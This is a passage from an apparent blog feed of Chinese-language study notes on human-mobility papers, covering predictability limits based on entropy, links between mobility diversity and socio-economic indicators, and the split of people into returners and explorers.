,$\Pi^{max}$通过以下给出</p><p>$S=H(\Pi_{max}+(1-\Pi^{max})log_2(N-1))$</p><p>$H(\Pi^{max})=-\Pi^{max}log_2(\Pi^{max})-(1-\Pi^{max})log_2(1-\Pi^{max})$</p><p>(二项分布的信息熵)</p><p>如果一个用户的$\Pi^{max}=0.2$ ,说明至少80%的时间下,个体选择地点的方式是随机的，我们仅可以在20%的时间内与预测他的行踪。$\Pi^{max}$代表个体可预测性的基本极限。</p><p>作者对$\Pi^{max}$的分布进行了统计，发现其并没有符合前边所说的胖尾分布，且在$\Pi^{max}=0.93$附近达到了峰值。</p><p><img src="/2021/08/19/819/image-20210828100445186.png" alt="image-20210828100445186"></p><p>这说明尽管这些个体的移动轨迹具有明显的随机性，但用户移动模式的记录隐藏着一种高度潜在可预测性。</p><p>作者还通过时间不相关熵和随机熵计算了对应的可预测性。</p><p>其中，$\Pi^{unc}$的分布表现出覆盖很宽，峰值在0.3左右，这说明如果我们只依赖于不同的空间分布，那么整个人口的预测能力是微不足道的，而且人与人之间差异很大。</p><p>$\Pi^{rand}$在0达到峰值，这说明该参数对预测没有作用。可预测性被加密隐藏在访问模式的时间序列中了。</p><h4 id="pt3"><a href="#pt3" class="headerlink" title="pt3."></a>pt3.</h4><p>如何使捕获的回转半径的广泛可变性与整个用户群体中观测到的高度可预测性一致?</p><p>本文绘制了$\Pi^{max}$与回转半径$r_g$的相关性</p><p><img src="/2021/08/19/819/image-20210828102136713.png" alt="image-20210828102136713"></p><p>当回转半径≥10km时，可预测性在很大程度上与回转半径无关，在$\Pi^{max}=0.93$左右趋于饱和。这解释了前面提出的假设失败:个体回转半径≥100km,定期覆盖数百千米和回转半径在10km以内的用户同样可以预测。</p><h4 id="pt4"><a href="#pt4" class="headerlink" title="pt4."></a>pt4.</h4><p>为了了解可预测性在多大程度上取决于移动模式中最常去的位置，作者计算了在给定时刻，用户处于最常访问n个位置之一的概率。因此，$\Pi$代表$\Pi^{max}$的上界。</p><p><img src="/2021/08/19/819/image-20210828102801162.png" alt="image-20210828102801162"></p><p>当n=1,我们可以预测用户的位置在最有可能的位置(“家”)</p><p>当n=2,我们可以预测用户的位置在他最常访问的两个位置之一，家或办公地。仅有60%的可预测性。</p><p>$\Pi$随n近似对数增长，当添加更多位置时，可预测性$\Pi$随之增长。</p><h4 id="pt5"><a href="#pt5" class="headerlink" title="pt5."></a>pt5.</h4><p>为了理解观察到的潜在可预测性的来源，将每周划分为168小时间隔，在每小时内确定每个用户在该时间内访问最多的位置。</p><p>计算每个用户的规律性R，定义为在用户访问最多位置找到用户的概率。R表示可预测性$\Pi$的下限，因为其忽略了个体移动的时间相关性。</p><p>在整个用户群中，R≈0.7  这说明70%的时间，访问次数最多的位置与用户的实际位置一致。这种模式与时间相关:大多数人晚上待在家里，此时R的峰值为0.9;但在中午到下午1点和下午六七点之间，R有明显的极小值(上下班高峰)。</p><p><img src="/2021/08/19/819/image-20210828103908802.png" alt="image-20210828103908802"></p><p>图A表示在对应的时间间隔内，用户在他最常访问位置的比例(规律性R)。</p><p>图B表示在对应的时间间隔内，用户访问位置数目。</p><p>高的规律性对应着小的数目，当R达到顶峰，N下降。</p><p>如果用户在N个位置之间随机移动，$R^{rand}=1/N$  $1/2^{S^{rand}}≈0.016$，比观测到R≈0.7小一个数量级。</p><p><img src="/2021/08/19/819/image-20210828111954363.png" alt="image-20210828111954363"></p><p>该图表示$R/R^{rand}$与回转半径相比，表现出回转半径大的用户有更高的相关规律性($R/R^{rand}$)。</p><p>也就是说，相反，移动次数多(回转半径大)的用户比在家较多的用户具有更高的相关规律性。</p><p>作者没有观察到$\Pi^{max}$在性别或年龄上有明显的差异，且家庭、语言群体、人口密度、城市与农村环境等因素对可预测性的影响只有微弱差异。与工作日相比，没有发现用户周末出行规律性有显著变化。这些都说明该规律性是人类活动潜在固有的。</p><h4 id="pt6"><a href="#pt6" class="headerlink" title="pt6."></a>pt6.</h4><p>回转半径大的个体移动并非没有什么可预测性，最大的可预测性变化非常小。$\Pi^{max}$达到93%的峰值，且在数据集中没有任何用户可预测性低于80%。</p><p>虽然明确预测用户的位置超出了我们能力范围，但适当的数据挖掘算法可以将我们研究中确定的可预测性转化为实际的移动预测。</p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>human mobility</tag>
      
      <tag>predictability</tag>
      
      <tag>entropy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Using Big Data to study the link between human mobility and socio-economic development</title>
    <link href="/2021/07/16/scd/"/>
    <url>/2021/07/16/scd/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>大数据提供了创建社会数字神经系统的可能性，实现对社会经济现象相关方面的实时测量、监测和预测。</p><p>本文研究了<strong>人类移动模式和社会经济发展的相关性</strong>。</p><p>测量了每个个体的移动量(mobility volume)和移动多样性(mobility diversity)，并在城市水平( municipality level)上聚合这些测量，研究其和外部社会经济指标( external socio-economic indicator)的相关性。</p><p>该研究发现三个结果:</p><p>①聚合的人类移动模式与社会经济指标相关</p><p>②移动多样性(用个体用户轨迹的熵来定义)与外部社会经济指标的相关性最强</p><p>③移动量和移动多样性与社会经济指标有相反的相关性</p><a id="more"></a><h2 id="Paper-Reading"><a href="#Paper-Reading" class="headerlink" title="Paper Reading"></a>Paper Reading</h2><p>Abstract同上述。</p><h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>提出一个问题:<strong>我们能否通过大数据的视角，仅仅通过观察居民的移动，来监测和预测城市的社会经济发展?</strong></p><p>文章随后介绍了多样性对自然生态系统的重要性，并指出<strong>多样性</strong>对于移动系统同样也是一个关键概念，<strong>移动模式的数量和多样性</strong>对城市的社会经济发展具有较高的预测能力。</p><p>文章基于大尺度移动电话数据进行以下处理:</p><p>(阐述了该研究发现的三个结果)</p><p>①在移动电话数据上定义两个个体移动的度量:</p><p>移动量:个体的特征行走距离( the characteristic traveled distance)，即个体移动的典型距离(the typical distance)</p><p>移动多样性:个体在他位置上移动的多样化,即个体移动的访问地点的分布</p><p>②在城市水平聚合两种个体度量并探索该聚合度量与不同方面的外部社会经济指标(财富、就业、教育和匮乏/贫困(deprivation))之间的相关性。</p><p>发现<strong>两种移动度量都与外部社会经济相关，特别是移动多样性表示出更强的相关性。</strong></p><p>③观察到在城市水平移动量和移动多样性与社会经济指标呈负相关或正相关，说明它们在城市社会经济发展中起不同的作用。</p><p>说明了该文章的重要性:<br>①移动量和移动多样性是可以用来深刻理解互联社会复杂性的关键概念。</p><p>②研究揭示了大数据在提供具有代表性、相对廉价和现成的度量作为社会经济发展的代理的高潜力。可以定义新的统计指标来描述一个地区的幸福指数(这类测量不能使用传统的普查和调查)</p><h3 id="Mobile-Phone-Data"><a href="#Mobile-Phone-Data" class="headerlink" title="Mobile Phone Data"></a>Mobile Phone Data</h3><p>记录了法国45天内2000w匿名用户的2亿次通话数据(CDR)</p><p>该数据格式:</p><p><img src="/2021/07/16/scd/image-20210716111016750.png" alt="image-20210716111016750"></p><p>经过筛选后剩余600万活跃用户的移动轨迹</p><h3 id="Socio-Economic-Data"><a href="#Socio-Economic-Data" class="headerlink" title="Socio-Economic Data"></a>Socio-Economic Data</h3><p>本文使用了法国INSEE提供的2007年所有官方居民超过1000人城市的社会经济指标数据集。</p><p>主要分为四个方面:</p><p>①个人平均收入:某一城市的平均收入</p><p>②教育率:城市中只有初等教育的居民占全市人口的比例</p><p>③失业率:失业人口与全市人口的比率</p><p>④匮乏/贫困指数:通过选择反映个体贫困的变量，将其与具体的系数进行线性组合形成单个指标,具体如下:<br><img src="/2021/07/16/scd/image-20210716160617181.png" alt="image-20210716160617181"></p><p>初步验证表明，该贫困指数与各城市的收入和教育存在高度关联。下图反映了法国城市水平上这四个指标的分布，每个分布都有明显的峰值，突出了典型的社会经济价值(socio-economic values)在整个法国城市的存在。</p><p><img src="/2021/07/16/scd/image-20210716161156009.png" alt="image-20210716161156009"></p><h3 id="Measuring-Human-Mobility"><a href="#Measuring-Human-Mobility" class="headerlink" title="Measuring Human Mobility"></a>Measuring Human Mobility</h3><h4 id="the-volume-of-mobility"><a href="#the-volume-of-mobility" class="headerlink" title="the volume of mobility"></a>the volume of mobility</h4><p>回转半径$r_g$度量移动量，表示个体移动的特征距离。</p><p>它描述了个体u从他的质心出发访问的信号塔的空间扩散过程。</p><p>$r_g(u)=\sqrt{\frac{1}{N}\sum_{i\in L}n_i(r_i-r_{cm})^2}$</p><p><img src="/2021/07/16/scd/image-20210716164152084.png" alt="image-20210716164152084"></p><p>该图描绘了两名用户的回转半径。其中圆圈的分布代表到访信号塔的空间分布，圆圈的大小与他们的访问频率成正比。</p><p>红色的圆圈代表最常访问的位置$L_1$(在静止状态下,个体u在此位置概率最高,很可能是他的家),十字代表质心，黑色的虚线代表回转半径。</p><p>UserA的回转半径较小，因为他访问的地点彼此接近</p><p>UserB的回转半径较大，因为他访问的地点互相远离</p><p><img src="/2021/07/16/scd/image-20210716165112850.png" alt="image-20210716165112850"></p><p>该图反映了回转半径在数据集中的分布，该分布很好地近似于一个重尾(heavy-tail)分布，表明回转半径有很大的可变性。</p><h4 id="the-diversity-of-mobility"><a href="#the-diversity-of-mobility" class="headerlink" title="the diversity of mobility"></a>the diversity of mobility</h4><p>使用Shannon熵来度量个体u的移动多样性</p><p>$S(u)=-\frac{\sum_{e\in E}p(e)\log p(e)}{\log N}$</p><p>其中e=(a,b)代表始出发信号塔和目标信号塔之间的一次移动，E是所有可能的出发地-目的地对的集合,p(e)是信号塔a和b之间发生移动的可能性，N是个体u移动轨迹的总数。</p><p>当个体从不同的起点和目的地进行许多不同的移动时，移动熵是高的;当个体表现出少数反复移动时,移动熵是低的。</p><p>通过回转半径测量，人类移动模式有惊人的异质性。通过移动熵测量，人类移动也同时具有高度的可预测性。</p><p><img src="/2021/07/16/scd/image-20210716172449311.png" alt="image-20210716172449311"></p><p>该图展示了数据集中两个个体移动熵的可视化网络。图中的结点代表信号塔，边代表两座信号塔之间发生的移动。结点的大小表明该用户在该信号塔发出呼叫次数，边的大小与该用户在边上行程次数成正比。</p><p>UserX具有较低的移动熵，因为他的行程分布在几个较大的首选边上</p><p>UserY具有较高的移动熵，因为他的行程分布在许多等大小的边上</p><p>移动熵还量化了预测个体未来行踪的可能性。具有非常规律的移动模式的个体拥有接近于零的移动熵，他们的行踪是相当可预测的；相反高移动熵的个体更不可预测。</p><p><img src="/2021/07/16/scd/image-20210716173356447.png" alt="image-20210716173356447"></p><p>该图反映了移动熵在数据集上的分布，表示人类移动模式的较高的平均可预测性。(Question1)</p><h3 id="Correlation-Analysis"><a href="#Correlation-Analysis" class="headerlink" title="Correlation Analysis"></a>Correlation Analysis</h3><p>在CDR数据集上计算这两种移动度量后，本文在城市水平对个体数据进行聚合:<br>①将每个用户访问最频繁位置$L_1$分配为他的家</p><p>②基于这些家的位置，将这些用户分配给相应的城市</p><p>通过计算分配到该城市的用户的平均值、均值和标准差来聚合回转半径和移动熵。</p><p>计算得到5100个城市的集合，其中每个城市包括这两个聚合的指标。</p><p>下表反映出聚合的移动度量与社会经济指标的相关性</p><p><img src="/2021/07/16/scd/image-20210716184144878.png" alt="image-20210716184144878"></p><p>从该表中，可以得到以下结论:</p><p>①移动多样性比移动量更能预测社会经济发展(无论以怎样的方式聚合，移动多样性有更强的相关性)(Fig5)</p><p>②人均收入、初等教育程度和贫困指数与移动度量的相关性强于失业率</p><p>③移动多样性和移动量对于社会经济指标有相反的相关</p><p>④实际数据得到该结果不是偶然的。本文将该结果与一个空模型比较(null model)，该模型将用户随机分配到法国各个城市。</p><ul><li><p>首先从数据集中均匀抽取N个用户，并将他们分配给一个随机的拥有N个用户的城市。</p></li><li><p>聚合分配给同一城市的用户的个体多样性度量</p></li><li>重复此过程100次,并取每个城市在这100次实验中聚合值的均值</li></ul><p>空模型的结果与所有社会经济指标没有相关性，证实了这一结论。</p><h3 id="Discussion-Of-The-Results"><a href="#Discussion-Of-The-Results" class="headerlink" title="Discussion Of The Results"></a>Discussion Of The Results</h3><p>该研究中最显著的结果是<strong>观察到人类移动，特别是移动多样性在城市尺度与社会经济指标相关。</strong></p><p>特别的是，<strong>在城市水平，移动熵与人均收入正相关，与贫困指数、初等教育率、失业率呈负相关。</strong></p><p><img src="/2021/07/16/scd/image-20210716184858005.png" alt="image-20210716184858005"></p><p>该图反映了人类移动度量与社会经济指标的相关性。通过x轴上测量的十分位数，将城市分为十等份。对于每个分组，在y轴上计算测量值的平均值和标准偏差，并通过黑色的误差条将它们绘制出来。可以观察到，<strong>移动熵与社会经济指标的相关性比旋转半径更强。</strong></p><p>本文指出<strong>人类移动的更多样化与更高的总体财富、更受教育的地区和更低水平的贫困有关。</strong></p><p><img src="/2021/07/16/scd/image-20210716201820421.png" alt="image-20210716201820421"></p><p><img src="/2021/07/16/scd/image-20210716201900760.png" alt="image-20210716201900760"></p><p>该图反映出移动熵在贫困指数不同十分位数的分布。</p><p>根据贫困指数的十分位数将城市划分为十个等大小的组。对于每个组，分别画出该组移动熵的分布。</p><p>蓝色虚线代表分布的拟合，红色虚线代表分布的平均值。</p><p>可以观察到由贫困指数定义的十分位数的移动熵分布的均值和方差都在系统地变化，描述了基于社会经济指标出现的熵的不同分布的亚种群(subpopulation)。</p><p> Limits of predictability in human mobility是人类移动的可预测性中一项开创性的工作，它指出移动熵在由性别或年龄等个人特征描述的不同亚种群中非常稳定。两项工作对比说明，<strong>城市的社会经济状况相比于个体人口特征，与个体流动性更相关。</strong></p><p>观察到的结果也表明社会经济发展与可预测性的关系:<strong>居住在更发达和更富裕地区的人表现出更高的移动熵，因此移动模式更不可预测。</strong></p><p>即使移动多样性与社会经济指标之间的相关性很明显，也很难提出一个假说来解释它们之间的联系。<strong>社会经济指标与移动多样性之间的联系是双向的。</strong>有可能是一个发展较好的地区提供各种各样的活动，先进的公共交通网络，更多就业机会和更多样化的工作，以及其他因素促进了移动的多样性。也可能是个体移动的更多样性导致更高的社会经济，因为它可以滋养经济，提供更多经济机会，促进人和货物的流动。</p><p>另一个结论是，<strong>移动量和移动多样性呈相反的关系。</strong></p><p>例如:由Fig5可以看出，聚合的移动量越高，社会经济发展水平越低;而聚合的移动多样性越高，社会经济发展水平越高。</p><p>假设人类移动是由日常活动驱动的，一个可能的解释是<strong>生活在发达城市的人们有广泛的活动，导致高度移动多样性;而生活在发展程度较低城市的人(比如在农村中)，被迫地去寻找在他的城市中找不到的活动，造成很大的移动量。</strong></p><p>为了研究这一假设，计算了聚合移动多样性与聚合移动量的相关性。</p><p><img src="/2021/07/16/scd/image-20210716214013842.png" alt="image-20210716214013842"></p><p>该图反映了聚合移动多样性和聚合移动量的相关性。根据平均熵的十分位数将城市分为十份等大小的组，对每组计算回转半径的平均值和标准差，并通过黑色的误差条将它们绘制出来。可以观察到，<strong>移动多样性和移动量之间呈负相关。</strong></p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>本文作者打算在三个方向上扩展本研究。</p><p>①社会多样性与移动多样性哪个更能代表社会经济发展以及它们在社会经济发展中所起的不同作用。</p><p>②更多了解聚合移动度量和社会经济指标之间的关系，有利于实施和验证预测模型。</p><p>③从多维视角考察人类移动模式与社会经济发展之间的关系，通过使用更多其他指标，来了解社会经济发展的哪些方面与提出的移动度量最相关。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="重尾分布"><a href="#重尾分布" class="headerlink" title="重尾分布"></a>重尾分布</h3><p><a href="https://swarma.org/?p=25283" target="_blank" rel="noopener">https://swarma.org/?p=25283</a></p><p>重尾分布 Heavy-tailed distributions是指其尾部呈现出不受指数限制的概率分布</p><p>同power-law</p><h3 id="香农熵"><a href="#香农熵" class="headerlink" title="香农熵"></a>香农熵</h3><p>拿出之前收藏的关于熵的博客:<a href="https://blog.csdn.net/Lison_Zhu/article/details/97234817" target="_blank" rel="noopener">https://blog.csdn.net/Lison_Zhu/article/details/97234817</a></p><p>香农熵即熵的定义</p><p>$H(X)=-\sum_{i=1}^np(x_i)\log p(x_i)$</p><p>定义事件$X=x_0$的信息量为:$l(x_0)=-\log p(x_0)$</p><p>当越不可能的事件发生了，我们获取到的信息量就越大。越可能发生的事件发生了，我们获取到的信息量就越小。信息量和事件发生的概率有关。而熵用来表示所有信息量的期望，n代表n种可能性。</p><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>1.到底可不可预测 Fig3图释表示人类移动模式的高度不可预测性，正文中表示个体的移动模式具有较高的平均可预测性。引用文章Limits of Predictability in Human Mobility中abstract提到:通过测量每个个体的移动熵，我们发现整个用户群的用户移动有93%的潜在可预测性。回头去深挖一下这篇文章，我觉得从我目前读过的角度来看，应该是高度的可预测性，但从移动熵的分布来看，高移动熵的人分布居多，明显更不可预测。</p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>human mobility</tag>
      
      <tag>entropy</tag>
      
      <tag>socio-economic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Returners and explorers dichotomy in human mobility</title>
    <link href="/2021/07/01/rae/"/>
    <url>/2021/07/01/rae/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>个体移动距离的相当大的变化性和他们未来位置的高度可预测性共存。</p><p>通过GPS和移动电话的数据，可以将个体分为两类:explorers&amp;returners。</p><p>returners和explorers在传播现象中起着不同量级的作用，他们的移动模式和社会互动之间存在相关性。</p><a id="more"></a><h2 id="Paper-Reading"><a href="#Paper-Reading" class="headerlink" title="Paper Reading"></a>Paper Reading</h2><p>个体移动距离的相当大的变化性和他们未来位置的高度可预测性共存：个体表现出广泛的移动范围但重复每天的日程安排。</p><p>这种看似矛盾的共存性可以通过量化反复运动(recurring movements)对流动性和影响来理解。</p><p>通过对数据(私家车辆产生的GPS轨迹和移动电话的呼叫详情记录)分析，我们可以将个体分为两类:explorers&amp;returners。</p><p>returners在几个首选地点反复运动，他们的移动距离使用回转半径(radius of gyration)来估计。</p><p>explorers少有反复运动，具有在大量不同地点运动的趋向。</p><p>本文指出现有人类移动模型不能解释个体的这两种类别，并提出一个改进模型可以复现出这两种移动模式。</p><p>最后证明returners和explorers在传播中起着不同的作用，个体的移动行为和其社会互动(social interactions)存在强烈相关性。</p><h3 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h3><h4 id="Datasets"><a href="#Datasets" class="headerlink" title="Datasets"></a>Datasets</h4><h5 id="GSM"><a href="#GSM" class="headerlink" title="GSM"></a>GSM</h5><p>第一份数据为匿名的3个月全球移动通信系统(GSM: Global System for Mobile Communications)记录。它包含67000个个体的通话记录。</p><p><img src="/2021/07/01/rae/image-20210701150241384.png" alt="image-20210701150241384"></p><p>该CDR(Call Detail Records)数据包括通信时间，发射塔所在坐标，通信双方与通信方式(通话/短信SMS)。</p><p>在观察期间访问至少2个以上地点的大约三百万用户中选择，经过过滤剩余67000+个体</p><p>对该数据进行过滤:</p><ul><li><p>对于每个用户，丢弃访问频率f≤0.005的位置  $f=n_i/N$ （$n_i$是该用户在i地点通信次数,N为该用户在观察期间总通信次数）</p><p>该条件检验位置是否与该用户的特定呼叫量有关。</p></li><li><p>不移动的个体对分析个体流动性没有意义，丢弃只有一个位置的用户。</p></li><li><p>只选择通信频率f≥0.5的活跃用户 $f=N/(24*91)$  (N为该用户在观察期间总通信次数，观察期间共91天，每天24小时)</p></li><li><p>排除异常活跃的用户 大量通信 $N&gt;k*91$ where k=300</p></li></ul><p>根据用户拨打电话的手机发射塔的时间顺序来重建用户的移动</p><h5 id="GPS"><a href="#GPS" class="headerlink" title="GPS"></a>GPS</h5><p>第二份数据为一份GPS数据集，存储了在一个月中经过意大利中部250平方千米的约46000辆汽车的行动轨迹。</p><p><img src="/2021/07/01/rae/image-20210701161628889.png" alt="image-20210701161628889"></p><p>每当车辆停车超过20分钟，我们就将时间戳，始发地和目的地坐标及车辆标识记录在数据集中。</p><p>该数据集存储了来自159000车辆980万次不同的行程(在一个月中经过意大利中部250平方千米)</p><p>设备每30秒通过GPRS连接向服务器发送的GPS点序列形成了车辆的全球轨迹。</p><p>当车辆停止时，没有点被记录或发送。我们利用这些停止点将全球轨迹分割为子轨迹。</p><p>和不同的活动相关，车辆具有不同时间的停止。我们只选择停止时间超过20min的停止点:如果车辆连续两次观测的时间间隔大于20min，则视第一次观测为行程结束，第二次观测为另一个行程的开始。</p><p>由于GPS数据没有提供关于访问地点的明确信息，将获得的子轨迹的每个起点和终点分配到相应的人口统计单元。</p><p>对该数据进行过滤:<br>只关注在单一地区进行的移动，并丢弃在观察时间只去过一个地点或平均每天行程少于一次的车辆数据。</p><p>最终剩余46000+辆车辆组成的数据。</p><p>GPS数据体现出一个月内在意大利某一区域内的移动，而GSM数据覆盖整个欧洲国家并且观察期为三个月。GSM数据包含人口远大于GPS，且通信数据所描述的轨迹包括所有可能的交通方式。</p><h4 id="measures"><a href="#measures" class="headerlink" title="measures"></a>measures</h4><p>使用总回转半径( the total radius of gyration)$r_g$ 来描述一个个体的移动距离</p><p>$r_g=\sqrt[]{\frac{1}{N}\sum_{i∈L}n_i(r_i-r_{cm})^2}$</p><p>L是个体访问地点的集合，$r_i$是位置i的坐标，$n_i$是个体访问位置i的访问频率或花费时间，$N=\sum_{i∈L}n_i$是个体在各个位置所有访问次数或花费的所有时间，$r_{cm}$是个体的几何中心(质心)坐标。(Question1)</p><p>访问最频繁的位置$L_1$是一个人静止状态时最易被找到的，如他的家。$L_k$指第k个访问最频繁的位置。</p><p>对于GSM数据，我们使用访问频率衡量权重;对于GPS数据，我们使用车辆在某个普查单元中的停留时间来衡量权重。</p><h3 id="Returners-and-explorers"><a href="#Returners-and-explorers" class="headerlink" title="Returners and explorers"></a>Returners and explorers</h3><h4 id="the-k-radius-of-gyration"><a href="#the-k-radius-of-gyration" class="headerlink" title="the k-radius of gyration"></a><strong>the k-radius of gyration</strong></h4><p>为了了解一个个体最常访问的第k个位置对他移动距离的作用，定义k回转半径( the k-radius of gyration)$r_g^{(k)}$</p><p>$r_g^{(k)}=\sqrt[]{\frac{1}{N_k}\sum_{i=1}^kn_i(r_i-r_{cm}^{(k)})^2}$</p><p>$r_{cm}^{(k)}$是计算k个最常访问的位置的几何中心  $N_k$是分配给第k个最常访问位置权值的总和</p><p>$r_g^{(k)}$表示个体的移动范围限制在k个最常访问位置之内</p><p>如果一个个体的$r_g^{(2)}\simeq r_g$ 说明他的移动主要由两个最常访问位置决定</p><p>如果一个个体的$r_g^{(2)}$比$r_g$小很多， 说明两个位置并不能准确地描述该个体的移动方式</p><h4 id="the-distributions-of-k-radii-and-total-radii"><a href="#the-distributions-of-k-radii-and-total-radii" class="headerlink" title="the distributions of k-radii and total radii"></a><strong>the distributions of k-radii and total radii</strong></h4><p><img src="/2021/07/01/rae/image-20210702101214115.png" alt="image-20210702101214115"></p><p>k=2,6,10时$r_g$与$r_g^{(k)}$的分布   图(a-c)为GSM数据  图(d-f)为GPS数据</p><p>黑色圆圈代表$r_g$  红色三角代表$r_g^{(k)}$在GSM数据   蓝色三角代表$r_g^{(k)}$在GPS数据</p><p>所有的分布都可以用截断幂律$P(r_g)=(r_g+r_0)^{(-\alpha)}e^{-\frac{r_g}{r_{cut}}}$来近似拟合</p><p>所有的曲线都是长尾的说明大多数个体移动符合短距离，也有部分个体移动距离较长</p><h4 id="the-correlation-between-recurrent-and-overall-mobility"><a href="#the-correlation-between-recurrent-and-overall-mobility" class="headerlink" title="the correlation between recurrent and overall mobility"></a><strong>the correlation between recurrent and overall mobility</strong></h4><p>总回转半径和k回转半径之间的相关性使我们能够量化整体移动和反复移动性之间的相似程度。下图反映了反复移动和整体移动的相关性</p><p><img src="/2021/07/01/rae/image-20210702152001250.png" alt="image-20210702152001250"></p><p>该散点图表示了$r_g$和$r_g^{(k)}$的关系,k=2,4,8  图a-c为GSM数据 图d-f为GPS数据  颜色表示相应区域内点的密度</p><p>大多数点集中在x轴 对角线和原点周围</p><p>随着k增大，越来越多的explorers开始变为returners。这种转变在GPS数据上更快，这与车辆移动访问的是经过地点和行程的子集的特点一致。</p><p>k-returners:集中在对角线附近的点对应的个体$r_g$与$r_g^{(k)}$近似相当，个体的移动主要由k个最常访问的位置决定。</p><p>k-explorers:集中在横坐标周围的点对应的个体$r_g^{(k)}$比$r_g$小很多，我们不能将其移动性规定到k个位置内。</p><p>无论对于较小的$r_g$还是较大的$r_g$ 个体都被分为两类</p><p><strong>随着k增大，k-returners的数量增大，explorers逐渐变为returners。当k等于访问的所有地点时，所有个体都是returner。</strong></p><p>虽然随k增大， explorers变为returners，但相反的过程却十分少见。</p><p>对于k=3,..,10 计算$\overline n$  k-exploers和(k-1)-returners的比值,$\overline n$ 随着k的增大而减小，并且非常小</p><p>(Question4)</p><p><img src="/2021/07/01/rae/image-20210704231616178.png" alt="image-20210704231616178"></p><p>该图表示returners向explorers的转化过程,画出了上述个体$r_g$和$r_g^{(2)}$的相关性，并发现个体坐落在平分线上。</p><p>左边是GSM数据，右边是GPS数据。虚线表示$r_g^{(k)}=r_g/2$ ，根据the bisector method区分returners和explorers。the bisector method未能正确分类个体，并随着k的增加产生了两个类别之间的波动</p><p>因为他们在平分线上，他们既不是2-returners也不是2-explorers。</p><p>文中使用the bisector method,support vector machine classifier,the expectation-maximization clustering algorithm三种方法对个体进行分类。这三种结果类似，说明这两类是容易分离的。故使用最简单的bisector method进行分类：</p><p><strong>如果$r_g^{(k)}&gt;r_g/2$ 则被分为returner,否则为explorer</strong></p><h4 id="the-ratio-between-recurrent-and-overall-mobility"><a href="#the-ratio-between-recurrent-and-overall-mobility" class="headerlink" title="the ratio between recurrent and overall mobility"></a>the ratio between recurrent and overall mobility</h4><p>比率$s_k=r_g^{(k)}/r_g$反映了个体的反复移动对其所有移动的影响</p><p>$s_k$值越高，个体移动轨迹中k个最常访问的位置所占权重越大</p><p>下图反映了反复移动和整体移动的比率</p><p><img src="/2021/07/01/rae/image-20210702164310685.png" alt="image-20210702164310685"></p><p>图a-c为在GSM数据上$s_k$的分布(k=2,4,8)   $s_k=0$对应explorers  $s_k=1$对应returners</p><p>在k=4时 returners和explorers数量达到均衡</p><p>图d-f为GPS数据上$s_k$的分布 对于所有k,returners一直占据多数</p><p><strong>一个可能的原因是，GPS数据只包含私人车辆的行程，因此丢失了一个个体不太常去的、可以通过火车或飞机到达的长途旅行地点。这些移动增加$r_g$而不对$r_g^{(k)}$产生影响，忽视这些移动会降低对个体$r_g$的估计，更容易将其归为returners。</strong></p><p>有一些个体$s_k&gt;1$  ($r_g^{(k)}&gt;r_g$) 表明(n−k)访问频率较低的位置平均比k个最频繁的位置更接近质心。(Question2)</p><p>Supplementary中进行了证明，设$\mu_k=1/k\sum_{i=1}^k(r_i-r_{cm})$为k个最常访问位置到整体质心$r_{cm}$的平均距离</p><p>$\mu_{n-k}=1/(n-k)\sum_{i=k+1}^n(r_i-r_{cm})$为其他n-k个位置到整体质心的平均距离</p><p>下图表示了$\mu_k$和$\mu_{n-k}$的比值在k=2时</p><p><img src="/2021/07/01/rae/image-20210702174806994.png" alt="image-20210702174806994"></p><p>其中红色方块代表$s_k&gt;1$的数据   $\mu_k≥\mu_{(n-k)}$</p><h4 id="the-individual-mobility-networks-of-returners-and-explorers"><a href="#the-individual-mobility-networks-of-returners-and-explorers" class="headerlink" title="the individual mobility networks of returners and explorers"></a><strong>the individual mobility networks of returners and explorers</strong></h4><p>returners和explorers访问地点的空间分布也不同。</p><p>访问地点的空间分布是区分returners和explorers的一个特征。</p><p><img src="/2021/07/01/rae/image-20210702220751763.png" alt="image-20210702220751763"></p><p>该图反映了returners和explorers的个体移动网络(k=2时)。</p><p>其中node表示个体访问过的地理位置，link表示表示在两个地点之间观察到的移动。</p><p>对于两种类别个体，访问地点都趋向于呈集群并带有一些异常值。</p><p>(1)$r_g$与$d(L_1,L_2)$ </p><p>$r_g$较小时，对于returners和explorers两个最频繁的地点都距离很近。</p><p>随着$r_g$增加，returners和explorers开始不同，对于two-returners两个最频繁的地点开始互相远离，<strong>这两个地点的距离增长与它们的总回转半径$r_g$ 成正比</strong>;而对于two-explorers,两个最频繁的地点依然保持很近,其他集群远离质心。</p><p>两个最频繁地点之间的距离对于returners随$r_g$增长的更快(相比于explorers)</p><p><img src="/2021/07/01/rae/image-20210702225801689.png" alt="image-20210702225801689"></p><p>该图表示两个最常访问位置之间的距离$d(L_1,L_2)$和总回转半径$r_g$的相关性。从图中可以看出，2-returners中的相关性远远强于2-explorers。</p><p>(2)访问位置关于$L_1$ $L_2$集群</p><p><strong>two-returners访问的地点聚集在他们最常访问的两个地点周围，two-explorers访问的地点更分散</strong></p><p>在Supplementary中 ( Supplementary Note 5, Supplementary Figs 5 and 6)设k个最常访问的位置为k个不同集群($C_1,…,C_k$)的质心。分配其他位置$L_i(i&gt;k)$到距离最近的质心。使用两个评价指标$SSE$(Sum of Squared Errors)和$SSE^*$来评估集群的凝聚性。 </p><p>$SSE$是集群内地点到质心的平方距离的总和，$SSE$值越大，该集群凝聚性越差。</p><p>$SSE=\sum_{i=1}^k\sum_{x\in C_i}dist(c_i,x)^2$   $c_i是集群C_i的质心$</p><p>$SSE^*=SSE/\overline {SSE}$</p><p>$\overline{SSE}$集群内地点到其他集群的质心的平方距离的总和</p><p>$\overline{SSE}=\sum_{i=1}^k\sum_{x\in C_i}\sum_{j=1,j\ne k}^kdist(c_j,x)^2$</p><p><img src="/2021/07/01/rae/image-20210703135129853.png" 